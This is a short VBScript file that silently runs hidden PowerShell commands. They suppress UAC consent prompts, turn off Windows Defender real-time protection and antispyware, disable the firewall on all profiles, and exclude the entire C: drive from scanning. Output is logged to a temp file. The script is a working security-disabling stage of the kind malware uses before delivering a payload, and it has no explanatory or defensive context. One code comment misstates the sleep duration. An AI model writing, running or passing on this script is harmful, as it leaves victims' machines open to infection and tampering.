Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
Dim logFile
logFile = WshShell.ExpandEnvironmentStrings("%TEMP%\script_log.txt")

Function RunCommand(command)
    WshShell.Run command & " >> """ & logFile & """ 2>&1", 0, True ' Redirecting stdout and stderr to logFile
    WScript.Sleep 4000 ' Wait for 3 seconds
End Function

' First PowerShell Command
RunCommand "powershell -command Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0"

' Second PowerShell Command
RunCommand "powershell -command Set-MpPreference -DisableRealtimeMonitoring $true"

' Third PowerShell Command
RunCommand "powershell -command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"

' Fourth PowerShell Command
RunCommand "powershell -command New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"

' Fifth PowerShell Command
RunCommand "powershell -command Add-MpPreference -ExclusionPath 'C:'"







